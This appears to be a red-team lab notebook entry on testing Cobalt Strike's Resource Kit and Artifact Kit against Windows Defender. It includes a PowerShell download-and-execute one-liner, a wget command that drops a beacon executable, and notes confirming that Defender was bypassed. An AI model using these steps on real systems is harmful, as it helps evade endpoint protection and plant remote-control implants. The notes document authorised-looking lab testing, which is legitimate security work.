#### Resource Kit
- deleted `/opt/cobaltstrike` and making `cobaltstrike_30JAN2025` into `/opt/cobaltstrike` for final testing
- renamed `arsenal_kit.cna` to `arsenal_kit-AV-BYPASS.cna`

![[Pasted image 20250317163200.png]]
copied  the tested `arsenal_kit-NO-AV-BYPASS.cna` from [[6. Resource Kit - arsenal_kit-NO-AV-BYPASS.cna]] to `/opt/cobaltstrike/arsenal-kit/dist`

loading the `arsenal_kit-AV-BYPASS.cna` to make sure that it still bypasses `defender` for `resource kit`

setting up `listeners`

starting `Scripted Web Delivery`

turning defender on

`iex(iwr http://192.168.127.129/resource -useb)`

caught beacon and bypassed defender - good to go

#### Artifact kit

testing with dropping file on desktop with `defender` on

hosting file
![[Pasted image 20250317164559.png]]

`wget http://192.168.127.129:80/artifact2 -UseBasicP -OutFile "C:\Users\blaster\Desktop\artifacttest.exe"`

dropping on `desktop` to see if it gets eaten. - gotta revert the `VM` - defender on now

![[Pasted image 20250317164647.png]]
was able to drop on `desktop`
![[Pasted image 20250317164743.png]]
was able to catch beacon and bypass defender
![[Pasted image 20250317164827.png]]
so trying to trouble shoot this, the `sha256sum` is the same for the `LEFT` side which is the default cobaltstrike build with no `AV` protections as well as the `RIGHT` which means that the artifact kit files are loaded separately  from the `aggressor scripts`.

### New Goals

- Create a script for the artifact kit that applies changes in a menu like script and can flip back and forth from AV - On and OFF
